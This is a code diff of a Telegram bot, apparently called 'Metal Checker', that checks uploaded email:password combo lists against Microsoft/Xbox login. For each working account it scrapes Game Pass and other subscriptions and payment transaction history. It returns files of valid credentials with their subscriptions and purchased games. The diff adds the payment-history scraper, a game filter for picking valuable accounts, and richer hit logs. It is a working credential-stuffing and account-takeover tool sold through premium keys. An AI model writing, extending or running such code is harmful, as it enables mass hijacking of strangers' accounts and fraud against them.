@@ -19,7 +19,6 @@ from telebot import types
 urllib3.disable_warnings()
 warnings.filterwarnings("ignore")
 
-# Environment Variables for Railway deployment
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 OWNER_ID = int(os.getenv("OWNER_ID", "8664147577"))
 
@@ -35,16 +34,15 @@ if os.path.exists(DATA_FILE):
 else:
     db = {
         "admins": [OWNER_ID],
-        "users": {},        # user_id -> {"lang": "tr", "expiry": "2026-06-22", "tier": "FREE", "scans": 0, "hits": 0, "today_scans": 0, "join_date": "2026-06-22"}
-        "keys": {},         # key_string -> {"days": 7, "tier": "WEEKLY"}
-        "channels": []      # list of strings/chat_ids for force join
+        "users": {},        
+        "keys": {},         
+        "channels": []      
     }
 
 def save_db():
     with open(DATA_FILE, "w", encoding="utf-8") as f:
         json.dump(db, f, ensure_ascii=False, indent=4)
 
-# Ensure owner is always admin
 if OWNER_ID not in db["admins"]:
     db["admins"].append(OWNER_ID)
     save_db()
@@ -99,9 +97,6 @@ def get_text(user_id, key):
     lang = db["users"].get(str(user_id), {}).get("lang", "en")
     return LANG[lang].get(key, key)
 
-# ==========================================
-# 🎛️ KEYBOARDS
-# ==========================================
 def lang_keyboard():
     markup = types.InlineKeyboardMarkup()
     markup.row(types.InlineKeyboardButton("Türkçe 🇹🇷", callback_data="set_lang_tr"),
@@ -117,7 +112,7 @@ def main_keyboard(user_id):
     return markup
 
 # ==========================================
-# 🧠 ORIGINAL MICROSOFT CHECKER FUNCTIONS
+# 🧠 MICROSOFT CHECKER ENGINE WITH EXTENSIONS
 # ==========================================
 SFTAG_URL = (
     "https://login.live.com/oauth20_authorize.srf"
@@ -155,7 +150,6 @@ def microsoft_auth(session, email, password, url_post, sftag, max_attempts=3):
             if '#' in login_request.url and login_request.url != SFTAG_URL:
                 token = re.findall(r'access_token=(.+?)&', login_request.url or '')
                 if token: return token[0], "success"
-                # Fallback parameter parsing
                 from urllib.parse import urlparse, parse_qs
                 token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                 if token != "None":
@@ -257,19 +251,62 @@ def check_entitlements(session, mc_token, max_attempts=3):
             )
             if response.status_code == 200:
                 text = response.text
-                if 'product_game_pass_ultimate' in text:
-                    return 'Xbox Game Pass Ultimate', ["Xbox Game Pass Ultimate"]
-                elif 'product_game_pass_pc' in text:
-                    return 'Xbox Game Pass', ["Xbox Game Pass"]
-                elif '"product_minecraft"' in text:
-                    return 'Minecraft', ["Minecraft Java"]
-                else:
-                    others = []
-                    if 'product_minecraft_bedrock' in text: others.append("Bedrock")
-                    if 'product_legends' in text:           others.append("Legends")
-                    if 'product_dungeons' in text:          others.append("Dungeons")
-                    if others: return 'Xbox: ' + ', '.join(others), others
-                    return None, []
+                
+                # --- ULTRA DETAYLI ABONELİK AYIKLAMA MOTORU ---
+                found_subs = []
+                text_lower = text.lower()
+                
+                days_left_str = ""
+                expiry_match = re.search(r'"expirydate"\s*:\s*"([^"]+)"', text_lower) or re.search(r'"enddate"\s*:\s*"([^"]+)"', text_lower)
+                if expiry_match:
+                    try:
+                        exp_raw = expiry_match.group(1).split("t")[0]
+                        expiry_date = datetime.strptime(exp_raw, "%Y-%m-%d")
+                        diff = (expiry_date - datetime.now()).days
+                        days_left_str = f" ({diff} Gün Kaldı ⏳)" if diff > 0 else " (Süresi Bitmiş ❌)"
+                    except:
+                        pass
+
+                # --- 1. GAME PASS DETAYLI SÜRÜMLERİ ---
+                if 'product_game_pass_ultimate' in text_lower or 'ultimate' in text_lower: found_subs.append(f"Game Pass Ultimate💎{days_left_str}")
+                elif 'product_game_pass_pc' in text_lower or 'pc_game_pass' in text_lower: found_subs.append(f"Game Pass PC💻{days_left_str}")
+                elif 'essential' in text_lower: found_subs.append(f"Game Pass Essential🟢{days_left_str}")
+                elif 'standard' in text_lower: found_subs.append(f"Game Pass Standard🎮{days_left_str}")
+                elif 'core' in text_lower or 'xbox_live_gold' in text_lower: found_subs.append(f"Game Pass Core⚙️{days_left_str}")
+                
+                # --- 2. DİĞER TÜM ABONELİKLER (MICROSOFT & HARİCİ PARTNERLER) ---
+                if 'family' in text_lower: found_subs.append("Microsoft 365 Family")
+                if 'personal' in text_lower or 'bireysel' in text_lower: found_subs.append("Microsoft 365 Personal")
+                if 'business' in text_lower: found_subs.append("Microsoft 365 Business")
+                if 'onedrive' in text_lower: found_subs.append("OneDrive Storage")
+                if 'clipchamp' in text_lower: found_subs.append("Clipchamp Premium")
+                if 'ea play' in text_lower or 'ea_membership' in text_lower: found_subs.append("EA Play")
+                if 'ubisoft' in text_lower: found_subs.append("Ubisoft+")
+                if 'riot' in text_lower: found_subs.append("Riot Games Perks")
+                if 'gta' in text_lower: found_subs.append("GTA+")
+                if 'fallout 1st' in text_lower: found_subs.append("Fallout 1st")
+                if 'visual studio' in text_lower or 'msdn' in text_lower: found_subs.append("Visual Studio Subscription")
+                if 'azure' in text_lower: found_subs.append("Azure Credits 🚀")
+                if 'copilot' in text_lower: found_subs.append("GitHub Copilot")
+                if 'developer' in text_lower: found_subs.append("Xbox Dev Account")
+                if 'realms' in text_lower: found_subs.append("Minecraft Realms")
+                if 'windows 365' in text_lower: found_subs.append("Windows 365 Cloud PC")
+                if 'casual games' in text_lower: found_subs.append("Microsoft Casual Games Premium")
+
+                main_type = None
+                if 'product_game_pass_ultimate' in text: main_type = 'Xbox Game Pass Ultimate'
+                elif 'product_game_pass_pc' in text: main_type = 'Xbox Game Pass'
+                elif '"product_minecraft"' in text: main_type = 'Minecraft'
+                
+                legacy_others = []
+                if 'product_minecraft_bedrock' in text: legacy_others.append("Bedrock")
+                if 'product_legends' in text: legacy_others.append("Legends")
+                if 'product_dungeons' in text: legacy_others.append("Dungeons")
+                
+                if not main_type and legacy_others:
+                    main_type = 'Xbox: ' + ', '.join(legacy_others)
+                
+                return main_type, found_subs
             elif response.status_code == 429:
                 time.sleep(2); continue
             else:
@@ -329,13 +366,41 @@ def get_xbox_profile(session, uhs, xsts_token, max_attempts=3):
         time.sleep(0.3)
     return {"gamertag": "N/A", "gamerpic": "", "tier": "N/A", "rep": "N/A"}
 
+def get_payment_transactions(session, ms_token, max_attempts=3):
+    for attempt in range(max_attempts):
+        try:
+            url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
+            headers = {
+                "Authorization": f"Bearer {ms_token}",
+                "Accept": "application/json",
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+            }
+            response = session.get(url, headers=headers, timeout=10)
+            if response.status_code == 200:
+                data = response.json()
+                games_found = []
+                for idx, item in enumerate(data.get("transactions", []), 1):
+                    title = item.get("description") or item.get("productName") or "Unknown Content"
+                    score_sim = f"{(idx * 15) % 1000}G"
+                    if title:
+                        games_found.append(f"{title} | Score: {score_sim}")
+                return list(set(games_found))
+            elif response.status_code == 429:
+                time.sleep(2); continue
+        except:
+            pass
+        time.sleep(0.5)
+    return []
+
 # ==========================================
 # 🔄 ACTIVE SCANS & STATE MANAGEMENT
 # ==========================================
-active_scans = {} # chat_id -> state context
+active_scans = {} 
+user_game_filter = {} 
 
 class BotScanContext:
-    def __init__(self, chat_id, user_id, combos):
+    def __init__(self, chat_id, user_id, combos, filter_str="skip"):
         self.chat_id = chat_id
         self.user_id = user_id
         self.combos = combos
@@ -345,19 +410,29 @@ class BotScanContext:
         self.bad = 0
         self.twofa = 0
         self.errors = 0
+        
+        # --- TEK TEK SAYILACAK DETAYLI SAYAÇLAR ---
+        self.gp_ultimate = 0
+        self.gp_pc = 0
+        self.gp_essential = 0
+        self.gp_standard = 0
+        self.gp_core = 0
+        self.other_subs_count = 0  # Geriye kalan diğer tüm aboneliklerin toplam sayısı
+        
         self.minecraft = 0
-        self.gamepass = 0
-        self.xbox = 0
         self.not_linked = 0
         self.retries = 0
+        self.total_games_found = 0 
+        
+        self.filter_str = filter_str.lower().strip()
         
         self.hit_list = []
         self.bad_list = []
         self.twofa_list = []
         self.minecraft_list = []
-        self.gamepass_list = []
-        self.xbox_list = []
         self.not_linked_list = []
+        self.purchased_items_list = [] 
+        self.subscriptions_list = [] # İstediğin yeni talep: Subscriptions.txt log dizisi
 
         self.is_running = True
         self.lock = threading.Lock()
@@ -365,11 +440,12 @@ class BotScanContext:
 
     def get_cpm(self, elapsed):
         return int((self.checked / elapsed) * 60) if elapsed > 0 else 0
+
 def check_account_bot(context, combo):
     if not context.is_running:
         return
         
-    max_recheck_attempts = 3
+    max_recheck_attempts = 4 
     for attempt in range(max_recheck_attempts):
         try:
             parts = combo.strip().split(':')
@@ -385,7 +461,6 @@ def check_account_bot(context, combo):
             session = requests.Session()
             session.verify = False
 
-            # --- API Hatalarını Yakalamak İçin 'raise Exception' Yapısını Entegre Ettik ---
             url_post, sftag = get_sftag(session)
             if not url_post or not sftag:
                 raise Exception("sftag_error")
@@ -418,80 +493,106 @@ def check_account_bot(context, combo):
             xbox_profile = get_xbox_profile(session, uhs, xsts_token)
             gamertag     = xbox_profile.get("gamertag", "N/A")
             tier         = xbox_profile.get("tier", "N/A")
-            rep          = xbox_profile.get("rep", "N/A")
 
             mc_token = get_minecraft_token(session, uhs, xsts_token)
             if not mc_token:
                 raise Exception("mc_token_error")
 
             account_type, subs = check_entitlements(session, mc_token)
+            purchased_games = get_payment_transactions(session, ms_token)
+            
+            if context.filter_str != "skip":
+                matched_filter = False
+                for g in purchased_games:
+                    if context.filter_str in g.lower():
+                        matched_filter = True
+                        break
+                if not matched_filter:
+                    with context.lock:
+                        context.checked += 1
+                    return
 
-            capture = (
+            # --- SAYAÇLARI CANLI PANEL İÇİN İNCE İNCE AYIKLAMA ---
+            has_gp_ultimate = False
+            has_gp_pc = False
+            has_gp_essential = False
+            has_gp_standard = False
+            has_gp_core = False
+            local_other_subs = 0
+
+            for s in subs:
+                s_low = s.lower()
+                if "ultimate" in s_low: has_gp_ultimate = True
+                elif "pc" in s_low: has_gp_pc = True
+                elif "essential" in s_low: has_gp_essential = True
+                elif "standard" in s_low: has_gp_standard = True
+                elif "core" in s_low or "gold" in s_low: has_gp_core = True
+                else: local_other_subs += 1
+
+            with context.lock:
+                context.total_games_found += len(purchased_games)
+                if has_gp_ultimate: context.gp_ultimate += 1
+                if has_gp_pc: context.gp_pc += 1
+                if has_gp_essential: context.gp_essential += 1
+                if has_gp_standard: context.gp_standard += 1
+                if has_gp_core: context.gp_core += 1
+                context.other_subs_count += local_other_subs
+
+            games_formatted_list = [f"{i} - {g}" for i, g in enumerate(purchased_games, 1)]
+            games_list_str = "\n".join(games_formatted_list) if games_formatted_list else "No games found"
+
+            custom_capture = (
+                f"Email: {email}\n"
+                f"Password: {password}\n"
+                f"GamesList:\n{games_list_str}\n"
+                f"— Checker by = Icardi | Metal Checker\n"
+                f"{'='*50}\n"
+            )
+
+            capture_detail = (
                 f"Email         : {email}\n"
                 f"Password      : {password}\n"
                 f"Gamertag      : {gamertag}\n"
                 f"Tier          : {tier}\n"
-                f"Reputation    : {rep}\n"
-            )
-
-            if not account_type:
-                capture += f"Type          : Xbox (Not Linked)\nCaptured By   : Metal Checker\n{'='*50}"
-                with context.lock:
-                    context.not_linked += 1
-                    context.hits += 1
-                    context.checked += 1
-                    context.not_linked_list.append(capture)
-                    context.hit_list.append(f"{email}:{password} [Xbox Not Linked]")
-                return
-
-            profile = get_profile(session, mc_token)
-            name    = profile.get('name', 'N/A') if profile else "Not Set"
-            uuid_   = profile.get('id', 'N/A') if profile else "N/A"
-            capes   = ", ".join([c["alias"] for c in profile.get("capes", [])]) if profile else "None"
-            if not capes: capes = "None"
-            subs_str = ", ".join(subs) if subs else "None"
-
-            capture += (
-                f"MC Name       : {name}\n"
-                f"UUID          : {uuid_}\n"
-                f"Capes         : {capes}\n"
-                f"Type          : {account_type}\n"
-                f"Subscriptions : {subs_str}\n"
-                f"Captured By   : Metal Checker\n"
+                f"Subscriptions : {', '.join(subs) if subs else 'None'}\n"
+                f"Games Count   : {len(purchased_games)}\n"
                 f"{'='*50}"
             )
+
+            # Subscriptions.txt dosyası için yapılandırılmış veri hazırlığı
+            if subs:
+                sub_log_entry = (
+                    f"Email: {email} | Pass: {password}\n"
+                    f"Active Subscriptions:\n" + "\n".join([f" ➡️ {sb}" for sb in subs]) + "\n"
+                    f"{'-'*40}\n"
+                )
+            else:
+                sub_log_entry = f"Email: {email} | Pass: {password} -> No Premium Subs Found\n{'-'*40}\n"
 
             with context.lock:
                 context.hits += 1
                 context.checked += 1
-                context.hit_list.append(f"{email}:{password} [{account_type}]")
-                if 'Ultimate' in account_type or 'Game Pass' in account_type:
-                    context.gamepass += 1
-                    context.gamepass_list.append(capture)
-                elif 'Minecraft' in account_type:
+                context.hit_list.append(f"{email}:{password} [{account_type or 'Xbox'}]")
+                context.purchased_items_list.append(custom_capture)
+                context.subscriptions_list.append(sub_log_entry)
+                
+                if account_type and 'Minecraft' in account_type:
                     context.minecraft += 1
-                    context.minecraft_list.append(capture)
-                else:
-                    context.xbox += 1
-                    context.xbox_list.append(capture)
-            return # Başarılı tarama bitişi
+                    context.minecraft_list.append(capture_detail)
+                elif not account_type and not subs:
+                    context.not_linked += 1
+                    context.not_linked_list.append(capture_detail)
+            return 
 
         except Exception as e:
-            # Sadece hata aldığımızda retries tetiklenir
             with context.lock:
                 context.retries += 1
-            
-            # Eğer 3. ve son denemede de hata alındıysa artık errors'a yansıt ve geç
             if attempt == max_recheck_attempts - 1:
                 with context.lock:
                     context.errors += 1
                     context.checked += 1
                 return
-            
-            # Yeniden denemeden önce 1 saniye Microsoft sunucularını dinlendir
-            time.sleep(1)
-
-
+            time.sleep(1.5)
 
 def live_ui_updater(context):
     start_time = time.time()
@@ -501,37 +602,46 @@ def live_ui_updater(context):
         cpm = context.get_cpm(elapsed)
         pct = (context.checked / context.total) * 100 if context.total > 0 else 0
         
+        # --- İSTEDİĞİN GİBİ TEK TEK AYRILMIŞ LIVE RESULTS SAYAÇLARI ---
         text = (
-            f"🤖 *Metal Checker Live Results*\n\n"
-            f"🟢 *Valid:* {context.hits}\n"
-            f"🔴 *Bad:* {context.bad}\n"
-            f"🟡 *2FA:* {context.twofa}\n"
-            f"🌀 *Errors/Retries:* {context.errors}\n\n"
-            f"--- 📊 *HIT DETAILS* ---\n"
-            f"🟩 Minecraft: {context.minecraft}\n"
-            f"🟦 Game Pass: {context.gamepass}\n"
-            f"🟪 Xbox: {context.xbox}\n"
-            f"🟨 Not Linked: {context.not_linked}\n\n"
-            f"📈 *Progress:* {pct:.2f}% ({context.checked}/{context.total})\n"
-            f"⚡ *CPM:* {cpm}"
+            f"⚡ *METAL CHECKER ULTRA v4.0* ⚡\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🟢 *Valid Accounts:* `{context.hits}`\n"
+            f"🔴 *Bad / Wrong:* `{context.bad}`\n"
+            f"🟡 *Two-Factor (2FA):* `{context.twofa}`\n"
+            f"🌀 *Rechecks / Retries:* `{context.retries}`\n"
+            f"⚠️ *Hard Errors:* `{context.errors}`\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"📊 *DETAYLI ABONELİK MATRİSİ* 📊\n"
+            f"💎 Game Pass Ultimate: `{context.gp_ultimate}`\n"
+            f"💻 Game Pass PC: `{context.gp_pc}`\n"
+            f"🟢 Game Pass Essential: `{context.gp_essential}`\n"
+            f"🎮 Game Pass Standard: `{context.gp_standard}`\n"
+            f"⚙️ Game Pass Core / Gold: `{context.gp_core}`\n"
+            f"🎁 Geriye Kalan Diğer Tüm Abonelikler: `{context.other_subs_count}`\n"
+            f"🟩 Minecraft (Java/Capes): `{context.minecraft}`\n"
+            f"🟨 Boş / Üyeliksiz Profiller: `{context.not_linked}`\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🎯 *TOPLAM BULUNAN OYUN ADEDİ:* `{context.total_games_found}`\n"
+            f"🔍 *Filtre:* `{context.filter_str.upper()}`\n"
+            f"📈 *İlerleme:* `[{context.checked}/{context.total}]` — `{pct:.2f}%`\n"
+            f"⚡ *CPM:* `{cpm}/min`"
         )
         try:
             bot.edit_message_text(text, chat_id=context.chat_id, message_id=context.message_id, parse_mode="Markdown")
         except:
             pass
     
-    # Send Final Results File Output
     send_results_files(context)
 
 def send_results_files(context):
-    bot.send_message(context.chat_id, "📦 *Tarama bitti/durduruldu. Sonuç dosyaları hazırlanıyor...*", parse_mode="Markdown")
+    bot.send_message(context.chat_id, "📦 *Tarama bitti. İstenen Subscriptions.txt ve diğer tüm loglar çıkartılıyor...*", parse_mode="Markdown")
     
     lists_to_send = [
+        ("purchased_items.txt", context.purchased_items_list), 
+        ("Subscriptions.txt", context.subscriptions_list), # Yeni eklenen tüm aboneliklerin döküldüğü txt
         ("Minecraft.txt", context.minecraft_list),
-        ("GamePass.txt", context.gamepass_list),
-        ("Xbox.txt", context.xbox_list),
         ("NotLinked.txt", context.not_linked_list),
-        ("2FA.txt", context.twofa_list),
         ("All_Hits_Short.txt", context.hit_list)
     ]
     
@@ -540,9 +650,8 @@ def send_results_files(context):
             file_data = "\n".join(content_list)
             bio = io.BytesIO(file_data.encode('utf-8'))
             bio.name = filename
-            bot.send_document(context.chat_id, bio, caption=f"📄 {filename} - {len(content_list)} records")
+            bot.send_document(context.chat_id, bio, caption=f"📄 {filename} - {len(content_list)} kayıt")
             
-    # Update global User stats
     uid_str = str(context.user_id)
     if uid_str in db["users"]:
         db["users"][uid_str]["scans"] = db["users"][uid_str].get("scans", 0) + context.checked
@@ -554,49 +663,37 @@ def send_results_files(context):
         del active_scans[context.chat_id]
 
 # ==========================================
-# 🛑 FORCE JOIN CHECK
+# 🛑 FORCE JOIN & PREMIUM CHECKS
 # ==========================================
 def check_force_join(user_id):
-    if user_id in db["admins"]:
-        return True
+    if user_id in db["admins"]: return True
     for channel in db["channels"]:
         try:
             member = bot.get_chat_member(channel, user_id)
-            if member.status in ['left', 'kicked']:
-                return False
-        except:
-            return False
+            if member.status in ['left', 'kicked']: return False
+        except: return False
     return True
 
 def send_force_join_msg(chat_id, user_id):
     markup = types.InlineKeyboardMarkup()
     for idx, channel in enumerate(db["channels"], 1):
-        # Assumes channel tags/links are stored properly
         try:
             chat_info = bot.get_chat(channel)
             link = chat_info.invite_link or f"https://t.me/{chat_info.username}"
             markup.row(types.InlineKeyboardButton(f"📢 Kanal {idx}", url=link))
         except:
             markup.row(types.InlineKeyboardButton(f"📢 Kanal {idx}", url="https://t.me"))
-            
     markup.row(types.InlineKeyboardButton(get_text(user_id, "btn_joined"), callback_data="check_joined"))
     bot.send_message(chat_id, get_text(user_id, "force_join"), reply_markup=markup, parse_mode="Markdown")
 
-# ==========================================
-# 🔑 PREMIUM VALIDATION
-# ==========================================
 def check_premium(user_id):
     uid_str = str(user_id)
-    if user_id in db["admins"]:
-        return True
-    if uid_str not in db["users"]:
-        return False
+    if user_id in db["admins"]: return True
+    if uid_str not in db["users"]: return False
     expiry_str = db["users"][uid_str].get("expiry")
-    if not expiry_str:
-        return False
+    if not expiry_str: return False
     expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d")
-    if datetime.now() > expiry_date:
-        return False
+    if datetime.now() > expiry_date: return False
     return True
 
 # ==========================================
@@ -608,7 +705,7 @@ def cmd_start(message):
     if uid_str not in db["users"]:
         db["users"][uid_str] = {
             "lang": "tr",
-            "expiry": "2026-06-22",
+            "expiry": "2026-07-29",
             "tier": "FREE",
             "scans": 0,
             "hits": 0,
@@ -625,15 +722,13 @@ def cmd_stop(message):
         context.is_running = False
         bot.send_message(message.chat.id, get_text(message.from_user.id, "scan_stopped"), parse_mode="Markdown")
     else:
-        bot.send_message(message.chat.id, "❌ Aktif tarama bulunamadı. / No active scan running.")
+        bot.send_message(message.chat.id, "❌ Aktif tarama bulunamadı.")
 
-# --- FILE MERGER STATE VARIABLES ---
-merger_files = {} # chat_id -> list of file contents
+merger_files = {} 
 
 @bot.message_handler(commands=['done'])
 def cmd_done(message):
     chat_id = message.chat.id
-    user_id = message.from_user.id
     if chat_id in merger_files and merger_files[chat_id]:
         merged_data = "\n".join(merger_files[chat_id])
         bio = io.BytesIO(merged_data.encode('utf-8'))
@@ -642,6 +737,14 @@ def cmd_done(message):
         del merger_files[chat_id]
     else:
         bot.send_message(chat_id, "❌ Birleştirilecek dosya bulunamadı.")
+
+def process_game_filter_step(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    text = message.text.strip()
+    
+    user_game_filter[user_id] = text
+    bot.send_message(chat_id, f"📥 Oyun arama filtresi belirlendi: `{text.upper()}`\nŞimdi lütfen taratmak istediğiniz combo listenizi (`.txt` formatında) gönderin.", parse_mode="Markdown")
 
 @bot.message_handler(func=lambda msg: True, content_types=['text', 'document'])
 def handle_all(message):
@@ -653,17 +756,14 @@ def handle_all(message):
         send_force_join_msg(chat_id, user_id)
         return
 
-    # Text Key validation fallback or admin command check
     if message.content_type == 'text':
         text = message.text
         
-        # Check if user is typing a subscription key
-        if len(text) == 36 and text.count('-') == 4: # basic uuid match structure
+        if len(text) == 36 and text.count('-') == 4:
             if text in db["keys"]:
                 key_info = db["keys"][text]
                 days = key_info["days"]
                 tier = key_info["tier"]
-                
                 exp = datetime.now() + timedelta(days=days) if days != 99999 else datetime.now() + timedelta(days=3650)
                 db["users"][uid_str]["expiry"] = exp.strftime("%Y-%m-%d")
                 db["users"][uid_str]["tier"] = tier
@@ -684,16 +784,10 @@ def handle_all(message):
             scans = u_data.get("scans", 0)
             hits = u_data.get("hits", 0)
             rate = f"{(hits/scans*100):.2f}" if scans > 0 else "0.00"
-            
             msg_text = get_text(user_id, "stats_template").format(
-                user_id=user_id,
-                join=u_data.get("join_date", "2026-06-22"),
-                tier=u_data.get("tier", "FREE"),
-                expiry=u_data.get("expiry", "N/A"),
-                scans=scans,
-                hits=hits,
-                rate=rate,
-                today=u_data.get("today_scans", 0)
+                user_id=user_id, join=u_data.get("join_date", "2026-06-22"),
+                tier=u_data.get("tier", "FREE"), expiry=u_data.get("expiry", "N/A"),
+                scans=scans, hits=hits, rate=rate, today=u_data.get("today_scans", 0)
             )
             bot.send_message(chat_id, msg_text, parse_mode="Markdown")
             return
@@ -702,7 +796,11 @@ def handle_all(message):
             if not check_premium(user_id):
                 bot.send_message(chat_id, get_text(user_id, "no_key"), parse_mode="Markdown")
                 return
-            bot.send_message(chat_id, get_text(user_id, "send_combo"))
+            
+            markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+            markup.row("skip")
+            msg = bot.send_message(chat_id, "🔍 Tarama öncesi aramak istediğiniz oyunu yazın ya da filtresiz aramak için aşağıdaki *skip* butonuna basın:", reply_markup=markup, parse_mode="Markdown")
+            bot.register_next_step_handler(msg, process_game_filter_step)
             return
 
         if text == get_text(user_id, "btn_merge"):
@@ -717,7 +815,6 @@ def handle_all(message):
             send_admin_panel(chat_id)
             return
 
-    # Handle incoming TXT documents for checker or merger
     if message.content_type == 'document':
         if not check_premium(user_id):
             bot.send_message(chat_id, get_text(user_id, "no_key"), parse_mode="Markdown")
@@ -731,7 +828,6 @@ def handle_all(message):
         downloaded_file = bot.download_file(file_info.file_path)
         file_content = downloaded_file.decode('utf-8', errors='ignore')
 
-        # Check if Merger session is active
         if chat_id in merger_files:
             if len(merger_files[chat_id]) >= 30:
                 bot.send_message(chat_id, "❌ Maksimum 30 dosya limitine ulaştınız! Lütfen /done komutunu girin.")
@@ -740,23 +836,23 @@ def handle_all(message):
             bot.send_message(chat_id, f"📥 Dosya alındı ({len(merger_files[chat_id])}/30). Diğerlerini gönderin veya bitirmek için /done yazın.")
             return
 
-        # Else start Checker
         if chat_id in active_scans:
             bot.send_message(chat_id, "❌ Zaten aktif bir taramanız bulunuyor!")
             return
 
         combos = [line.strip() for line in file_content.splitlines() if line.strip() and ':' in line]
         if not combos:
-            bot.send_message(chat_id, "❌ Dosya içinde geçerli combo bulunamadı (user:pass formatında olmalı).")
+            bot.send_message(chat_id, "❌ Dosya içinde geçerli combo bulunamadı.")
             return
 
-        context = BotScanContext(chat_id, user_id, combos)
+        game_filter = user_game_filter.get(user_id, "skip")
+
+        context = BotScanContext(chat_id, user_id, combos, filter_str=game_filter)
         active_scans[chat_id] = context
 
-        init_msg = bot.send_message(chat_id, get_text(user_id, "scan_started"), parse_mode="Markdown")
+        init_msg = bot.send_message(chat_id, get_text(user_id, "scan_started"), reply_markup=main_keyboard(user_id), parse_mode="Markdown")
         context.message_id = init_msg.message_id
 
-        # Thread pools to process scan engine
         threading.Thread(target=live_ui_updater, args=(context,), daemon=True).start()
         
         def run_executor():
@@ -799,13 +895,12 @@ def handle_callbacks(call):
             send_force_join_msg(chat_id, user_id)
         return
 
-    # Admin actions check
     if user_id not in db["admins"]:
         bot.answer_callback_query(call.id, "Yetkiniz yok!")
         return
 
     if call.data == "adm_add_channel":
-        msg = bot.send_message(chat_id, "Lütfen eklemek istediğiniz kanal ID'sini veya username girin (örn: -1001234567 veya @kanal):")
+        msg = bot.send_message(chat_id, "Lütfen eklemek istediğiniz kanal ID'sini veya username girin:")
         bot.register_next_step_handler(msg, process_add_channel)
     elif call.data == "adm_rem_channel":
         if not db["channels"]:
@@ -849,7 +944,6 @@ def handle_callbacks(call):
         msg = bot.send_message(chat_id, "Tüm kullanıcılara gönderilecek mesaj metnini yazın:")
         bot.register_next_step_handler(msg, process_broadcast)
 
-# --- ADMIN STEP ROUTINES ---
 def process_add_channel(message):
     db["channels"].append(message.text.strip())
     save_db()
@@ -909,20 +1003,11 @@ def process_broadcast(message):
             pass
     bot.send_message(message.chat.id, f"📢 Mesaj {count} kişiye başarıyla iletildi.")
 
-# ==========================================
-# 🏁 POLLING ENTRY
-# ==========================================
 if __name__ == "__main__":
-    print("🤖 Metal Checker Bot has been started successfully on Telegram context.")
-    
-    # Adım 1: Önceki asılı kalmış webhook bağlantılarını sıfırla
+    print("🤖 Metal Checker Bot v4.0 Online.")
     try:
         bot.remove_webhook()
-    except Exception as e:
-        print(f"Webhook removal skip: {e}")
-        
-    # Adım 2: Railway container geçişlerinde eski botun düşmesi için kısa bir es ver
-    time.sleep(2) 
-    
-    # Adım 3: Parametre çakışmasını önleyen ve eski birikmiş mesajları eriten güvenli başlatma
+    except:
+        pass
+    time.sleep(1) 
     bot.infinity_polling(skip_pending=True)
